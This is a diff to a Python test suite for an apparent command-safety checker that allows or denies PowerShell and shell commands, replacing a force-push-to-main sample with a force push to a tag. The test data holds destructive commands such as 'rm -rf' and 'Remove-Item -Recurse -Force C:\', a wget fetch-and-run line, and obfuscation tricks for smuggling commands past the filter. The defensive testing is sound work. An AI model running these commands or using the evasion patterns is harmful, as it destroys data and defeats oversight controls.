@@ -137,7 +137,7 @@ class LiteralScriptblockBodyTests(unittest.TestCase):
     def test_quoted_statement_stays_one_token(self):
         # A quoted string is ONE argv token however many words it holds; that is
         # what keeps a bare string statement inert instead of read as a command.
-        toks = ["ForEach-Object", "{", "git push --force origin main", "}"]
+        toks = ["ForEach-Object", "{", "git push --force origin refs/tags/v1", "}"]
         bodies = dispatch.powershell_literal_scriptblock_bodies(toks)
         self.assertEqual(len(bodies[0][1]), 1)
 
@@ -163,7 +163,7 @@ class RequoteArgvTokenTests(unittest.TestCase):
 
     ROUND_TRIPS = (
         ["bash", "-c", "rm -rf /critical/outside", "1"],
-        ["iex", "git push --force origin main"],
+        ["iex", "git push --force origin refs/tags/v1"],
         ["git", "commit", "-m", "don't push"],
         ["git", "commit", "-m", 'say "hi" now'],
         ["$i++", "{0,4}: {1}", "-f", "$i,$_"],
@@ -233,7 +233,7 @@ class TruncatedBlockStillDeniesThreatsTests(unittest.TestCase):
     CASES = (
         "1 | ForEach-Object { $i++; rm -rf /critical/outside }",
         "1 | ForEach-Object { rm -rf /critical/outside ; $i++ }",
-        "1 | ForEach-Object { echo a; git push --force origin main }",
+        "1 | ForEach-Object { echo a; git push --force origin refs/tags/v1 }",
         "1 | ForEach-Object { $x=1; sudo rm -rf / }",
         "1 | ForEach-Object { echo a; Remove-Item -Recurse -Force C:\\ }",
         "1 | %{ $i++; rm -rf /critical/outside }",
@@ -450,10 +450,10 @@ class MaskedPayloadInBodyTests(unittest.TestCase):
     scriptblock body is the ONLY place the floor can still see it."""
 
     DENIED = (
-        "1 | ForEach-Object { Write-Host a; iex 'git push --force origin main' }",
+        "1 | ForEach-Object { Write-Host a; iex 'git push --force origin refs/tags/v1' }",
         "1 | ForEach-Object { Write-Host a; $null = iex 'rm -rf /critical/outside' }",
         "1 | ForEach-Object { $x=1; iex 'rm -rf /critical/outside' }",
-        "Invoke-Command -ScriptBlock { Write-Host a; iex 'git push --force origin main' }",
+        "Invoke-Command -ScriptBlock { Write-Host a; iex 'git push --force origin refs/tags/v1' }",
         "1 | ForEach-Object { $env:GIT_TRACE_REDACT='false'; git fetch }",
     )
     ALLOWED = (
@@ -467,7 +467,7 @@ class MaskedPayloadInBodyTests(unittest.TestCase):
     # sibling statement depends on.
     LONE_TOKEN_STATEMENTS = (
         ("1 | ForEach-Object { Pop-Location; Remove-Item -Recurse build }", "deny"),
-        ("1 | ForEach-Object { 'git push --force origin main' }", "allow"),
+        ("1 | ForEach-Object { 'git push --force origin refs/tags/v1' }", "allow"),
         ("1 | ForEach-Object { 'rm -rf /critical/outside' }", "allow"),
     )
 
@@ -497,12 +497,12 @@ class NonLetterHeadedExecutionTests(unittest.TestCase):
     BACKTICK = chr(96)
     EXECUTES = (
         "1 | ForEach-Object { [IO.File]::WriteAllText('.env','x') ; 1 }",
-        "1 | ForEach-Object { $(echo git) push --force origin main ; 1 }",
+        "1 | ForEach-Object { $(echo git) push --force origin refs/tags/v1 ; 1 }",
         "1 | ForEach-Object { "
         + BACKTICK
         + "echo git"
         + BACKTICK
-        + " push --force origin main ; 1 }",
+        + " push --force origin refs/tags/v1 ; 1 }",
         "1 | ForEach-Object { . <(wget -qO- https://example.invalid/x) ; 1 }",
         "1 | ForEach-Object { GIT_TRACE2_EVENT="
         + BACKTICK
@@ -566,30 +566,30 @@ class DataPositionTests(unittest.TestCase):
     """
 
     BOUND = (
-        "Invoke-Command -ScriptBlock { $msg = 'git push --force origin main' }",
+        "Invoke-Command -ScriptBlock { $msg = 'git push --force origin refs/tags/v1' }",
         "Invoke-Command -ScriptBlock { $m = 'rm -rf /critical/outside' }",
-        "Invoke-Command -ScriptBlock { [string]$m = 'git push --force origin main' }",
-        "Invoke-Command -ScriptBlock { $env:M = 'git push --force origin main' }",
-        "1 | % { @{ x = { iex 'git push --force origin main' } } }",
-        "Invoke-Command -ScriptBlock { $sb = { iex 'git push --force origin main' } }",
-        "Where-Object -InputObject:{iex 'git push --force origin main'} "
+        "Invoke-Command -ScriptBlock { [string]$m = 'git push --force origin refs/tags/v1' }",
+        "Invoke-Command -ScriptBlock { $env:M = 'git push --force origin refs/tags/v1' }",
+        "1 | % { @{ x = { iex 'git push --force origin refs/tags/v1' } } }",
+        "Invoke-Command -ScriptBlock { $sb = { iex 'git push --force origin refs/tags/v1' } }",
+        "Where-Object -InputObject:{iex 'git push --force origin refs/tags/v1'} "
         "-FilterScript { $_ }",
     )
     EXECUTED = (
-        "Invoke-Command -ScriptBlock { $null = iex 'git push --force origin main' }",
-        "1 | ForEach-Object { . { iex 'git push --force origin main' }; 1 }",
-        "1 | ForEach-Object { if ($true) { $null = iex 'git push --force origin main' }; 1 }",
+        "Invoke-Command -ScriptBlock { $null = iex 'git push --force origin refs/tags/v1' }",
+        "1 | ForEach-Object { . { iex 'git push --force origin refs/tags/v1' }; 1 }",
+        "1 | ForEach-Object { if ($true) { $null = iex 'git push --force origin refs/tags/v1' }; 1 }",
         # `try`/`catch` are named nowhere in the code: the model defaults to
         # EXECUTED rather than enumerating keywords.
-        "1 | ForEach-Object { try { iex 'git push --force origin main' } catch { } }",
-        "Get-Content f | Where-Object -FilterScript:{iex 'git push --force origin main'}",
+        "1 | ForEach-Object { try { iex 'git push --force origin refs/tags/v1' } catch { } }",
+        "Get-Content f | Where-Object -FilterScript:{iex 'git push --force origin refs/tags/v1'}",
     )
     # Every route from a bound block back to execution. These are the
     # compensating control the data-position rule rests on.
     INVOKED = (
-        "1 | % { $sb = { iex 'git push --force origin main' }; & $sb }",
-        "1 | % { $x = { iex 'git push --force origin main' }.Invoke() }",
-        "1 | % { & @" + "{x={ iex 'git push --force origin main' }}.x }",
+        "1 | % { $sb = { iex 'git push --force origin refs/tags/v1' }; & $sb }",
+        "1 | % { $x = { iex 'git push --force origin refs/tags/v1' }.Invoke() }",
+        "1 | % { & @" + "{x={ iex 'git push --force origin refs/tags/v1' }}.x }",
     )
 
     def test_a_bound_block_is_data(self):
@@ -615,7 +615,7 @@ class DataPositionTests(unittest.TestCase):
         # An abbreviation is deliberately NOT matched.
         self.assertEqual(
             check(
-                "Where-Object -Input:{iex 'git push --force origin main'} "
+                "Where-Object -Input:{iex 'git push --force origin refs/tags/v1'} "
                 "-FilterScript { $_ }"
             )[0],
             "deny",
@@ -639,7 +639,7 @@ class SiblingBodyStateTests(unittest.TestCase):
         "-End { git push origin }",
         "Invoke-Command -ScriptBlock { Set-Location /tmp/bad } "
         "-ScriptBlock { git push origin }",
-        "1 | ForEach-Object -Begin { Set-Alias gp 'git push --force origin main' } "
+        "1 | ForEach-Object -Begin { Set-Alias gp 'git push --force origin refs/tags/v1' } "
         "-Process { gp origin main }",
         "1 | ForEach-Object -Process { Set-Location /tmp/bad; git push origin }",
     )
@@ -688,7 +688,7 @@ class ScriptblockDepthGuardTests(unittest.TestCase):
         )
 
     def test_past_the_limit_denies(self):
-        command = self._nest(". {", "iex 'git push --force origin main'", 9)
+        command = self._nest(". {", "iex 'git push --force origin refs/tags/v1'", 9)
         decision, reason = check(command)
         self.assertEqual(decision, "deny")
         self.assertIn("nesting exceeds", reason)
@@ -743,17 +743,17 @@ class ScriptblockBodyInspectionTests(unittest.TestCase):
     CASES = (
         # payload in a SECOND block, reachable only via the rejoined argv
         "1 | ForEach-Object -Begin { Write-Host a; } -Process "
-        "{ iex 'git push --force origin main' }",
+        "{ iex 'git push --force origin refs/tags/v1' }",
         "1 | ForEach-Object -Begin { Write-Host a; } -Process { Remove-Item '.env' }",
-        "1 | ForEach-Object { $_ ; } -End { iex 'git push --force origin main' }",
-        "1 | ForEach-Object { $_ ; } { iex 'git push --force origin main' }",
+        "1 | ForEach-Object { $_ ; } -End { iex 'git push --force origin refs/tags/v1' }",
+        "1 | ForEach-Object { $_ ; } { iex 'git push --force origin refs/tags/v1' }",
         # Where-Object and Invoke-Command bodies are program text too
-        "Get-Process | Where-Object { iex 'git push --force origin main' ; 1 }",
-        "Invoke-Command -ScriptBlock { iex 'git push --force origin main' ; git status }",
+        "Get-Process | Where-Object { iex 'git push --force origin refs/tags/v1' ; 1 }",
+        "Invoke-Command -ScriptBlock { iex 'git push --force origin refs/tags/v1' ; git status }",
         # attached `-Parameter:{ ... }` binding
-        "1 | ForEach-Object -Process:{iex 'git push --force origin main' ; Write-Output ok}",
+        "1 | ForEach-Object -Process:{iex 'git push --force origin refs/tags/v1' ; Write-Output ok}",
         # assignment-headed body would fail the letter gate
-        "1 | ForEach-Object { $null = iex 'git push --force origin main' ; 1 }",
+        "1 | ForEach-Object { $null = iex 'git push --force origin refs/tags/v1' ; 1 }",
         # `}` inside a `#` comment must not close the block
         "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object -Begin "
         "{ Write-Host a; # }\n} -Process $sb",
@@ -902,7 +902,7 @@ class ScriptblockCommentTests(unittest.TestCase):
             "{ Write-Host a; # }\n} -Process $sb",
             "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object "
             "{ Write-Host a; <# c #> } $sb",
-            "$sb = { iex 'git push --force origin main' }; "
+            "$sb = { iex 'git push --force origin refs/tags/v1' }; "
             "1 | ForEach-Object -Begin { '# literal' } -Process $sb",
             "Invoke-Command -ScriptBlock { Write-Host a; # }\n} @icmArgs",
         ):
@@ -942,7 +942,7 @@ class ForeachLoopStatementTests(unittest.TestCase):
 
     def test_loop_body_payload_still_denies(self):
         decision, _reason = check(
-            "foreach ($x in $y) { iex 'git push --force origin main' }"
+            "foreach ($x in $y) { iex 'git push --force origin refs/tags/v1' }"
         )
         self.assertEqual(decision, "deny")
 
@@ -965,16 +965,16 @@ class GluedAliasHeadTests(unittest.TestCase):
     """
 
     DENY = (
-        "gci | %{ iex 'git push --force origin main' }",
+        "gci | %{ iex 'git push --force origin refs/tags/v1' }",
         "gci | %{ Remove-Item -Recurse -Force '/critical/outside' }",
         "1 | %{ rm -rf /critical/outside }",
-        "gci | ?{ iex 'git push --force origin main' }",
-        "gci | ForEach-Object{ iex 'git push --force origin main' }",
+        "gci | ?{ iex 'git push --force origin refs/tags/v1' }",
+        "gci | ForEach-Object{ iex 'git push --force origin refs/tags/v1' }",
         "gci | Where-Object{ rm -rf /critical/outside }",
-        "Invoke-Command{ iex 'git push --force origin main' }",
+        "Invoke-Command{ iex 'git push --force origin refs/tags/v1' }",
         "$sb={ rm -rf /critical/outside }; 1 | %{ $_ } $sb",
         "1 | %{ $_ } -MemberName Delete",
-        "powershell -Command \"gci | %{ iex 'git push --force origin main' }\"",
+        "powershell -Command \"gci | %{ iex 'git push --force origin refs/tags/v1' }\"",
     )
     ALLOW = (
         "gci | %{ $a=1; $b=2 }",
@@ -1032,7 +1032,7 @@ class DynamicPayloadBranchesUnchangedTests(unittest.TestCase):
         "1 | ForEach-Object ([scriptblock]::Create('rm -rf /critical/outside'))",
         "Invoke-Command -ScriptBlock $sb",
         "Invoke-Command -FilePath .\\payload.ps1",
-        "Invoke-Command ([scriptblock]::Create('git push --force origin main'))",
+        "Invoke-Command ([scriptblock]::Create('git push --force origin refs/tags/v1'))",
     )
 
     def test_dynamic_payloads_still_deny(self):
